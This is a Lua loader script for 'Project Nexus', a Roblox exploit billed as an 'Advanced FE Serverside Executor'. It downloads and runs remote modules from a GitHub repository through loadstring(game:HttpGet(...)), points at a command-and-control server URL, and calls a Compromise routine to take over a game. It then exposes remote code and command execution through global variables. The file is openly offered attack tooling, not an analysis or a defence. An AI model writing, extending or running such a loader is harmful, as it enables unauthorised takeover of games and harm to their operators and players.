--[[
    Project Nexus - Quick Loader
    Single-line loader for fast deployment
    
    Usage:
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
]]

local function loadNexus()
    print([[
    ╔═══════════════════════════════════════════════╗
    ║          PROJECT NEXUS v1.0                    ║
    ║     Advanced FE Serverside Executor            ║
    ╚═══════════════════════════════════════════════╝
    ]])
    
    -- Configuration
    local GITHUB_REPO = "HyperCodez495/ProjectNexus-Roblox-Script"
    local GITHUB_BRANCH = "main"
    local GITHUB_BASE = string.format("https://raw.githubusercontent.com/%s/%s/", GITHUB_REPO, GITHUB_BRANCH)
    
    local config = {
        githubBase = GITHUB_BASE,
        serverUrl = "http://localhost:8080",  -- Your C&C server
        autoInit = true,
        autoScan = true,
        showGui = true
    }
    
    -- Load main module
    print("[NEXUS] Loading from GitHub...")
    local Nexus = loadstring(game:HttpGet(GITHUB_BASE .. "main.lua"))()
    
    if not Nexus then
        warn("[NEXUS] Failed to load main module")
        return
    end
    
    -- Create instance
    local instance = Nexus.new({
        commandServer = config.serverUrl,
        autoScan = config.autoScan,
        persistentMode = true
    })
    
    -- Initialize
    if config.autoInit then
        local success = instance:Initialize()
        if not success then
            warn("[NEXUS] Initialization failed")
            return
        end
    end
    
    -- Try to compromise
    spawn(function()
        wait(2)
        local compromised = instance:Compromise()
        if compromised then
            print("[NEXUS] Game successfully compromised!")
            
            -- Load GUI if configured
            if config.showGui then
                print("[NEXUS] Loading GUI from GitHub...")
                local GUI = loadstring(game:HttpGet(config.githubBase .. "client/gui.lua"))()
                if GUI then
                    local gui = GUI.new()
                    gui:Create()
                    print("[NEXUS] GUI loaded - Press Right Shift to toggle")
                    
                    -- Toggle keybind
                    game:GetService("UserInputService").InputBegan:Connect(function(input)
                        if input.KeyCode == Enum.KeyCode.RightShift then
                            gui:Toggle()
                        end
                    end)
                end
            end
        else
            warn("[NEXUS] Compromise failed - no exploitable vectors found")
            print("[NEXUS] Scan results available via instance:ScanCurrentGame()")
        end
    end)
    
    -- Export to global
    _G.Nexus = Nexus
    _G.NexusInstance = instance
    
    print("[NEXUS] Loaded successfully - Access via _G.NexusInstance")
    print("[NEXUS] Commands: instance:Execute(code), instance:Command(cmd, ...)")
    
    return instance
end

return loadNexus()
